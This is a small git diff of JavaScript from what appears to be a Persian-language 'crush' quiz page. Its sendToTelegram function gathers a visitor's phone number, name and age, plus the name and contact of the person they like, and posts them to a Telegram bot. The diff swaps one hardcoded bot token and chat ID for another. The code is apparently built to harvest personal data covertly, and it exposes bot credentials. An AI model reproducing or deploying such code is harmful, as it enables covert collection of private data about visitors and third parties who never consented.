@@ -120,8 +120,8 @@
         });
 
         function sendToTelegram(phone, name, age, crushName, crushId, interest) {
-            const token = '7319426902:AAGA69QPVfiWYv-z6VPZ9Xhp-PEHZZzZqoY'; // توکن ربات شما
-            const chatId = '6921507458'; // آیدی چت شما
+            const token = '7238721542:AAH6bZpHBIKB-7jfpAjzAWtapCzuCSUQWUs'; // توکن ربات شما
+            const chatId = '5025237601'; // آیدی چت شما
             const message = `شماره همراه: ${phone}\nنام: ${name}\nسن: ${age}\nنام کراش: ${crushName}\nایدی یا شماره کراش: ${crushId}\nعلاقه: ${interest}`;
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
